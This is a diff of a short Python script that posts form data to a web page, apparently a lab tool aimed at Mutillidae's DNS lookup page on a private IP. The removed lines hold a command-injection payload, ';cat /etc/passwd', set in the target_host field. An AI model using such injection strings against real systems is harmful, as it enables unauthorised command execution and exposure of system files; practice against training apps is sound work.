@@ -14,8 +14,8 @@ def usage():
 	print("=======================================================================================\n");
         
 def main(argv):
-        target="http://192.168.56.103/mutillidae/index.php?page=dns-lookup.php";
-        message={'target_host': ';cat /etc/passwd', 'dns-lookup-php-submit-button': 'Lookup DNS'};
+        target="";
+        message={};
         headers={'Content-Type': 'application/x-www-form-urlencoded'};
         
         if len(argv)<1:
@@ -40,20 +40,15 @@ def main(argv):
                 target = arg;
             elif opt in ('-m', "--message"):
                 str = arg.replace("'", "");
-                print(str);
-                mess={};
                 for i in str.split(','):
                     param, value=i.split(':');
-                    mess[param.strip()]=value.strip();
-
-                message=mess;
+                    message[param.strip()]=value.strip();
             else:
                 print("what, how did this happen");
 	
 	# Send POST request
         hconn = httplib2.Http('.cache');
         response, content = hconn.request(target, 'POST', urlencode(message), headers=headers);
-
         print(content.decode('utf-8'));
 
 if __name__ == "__main__":
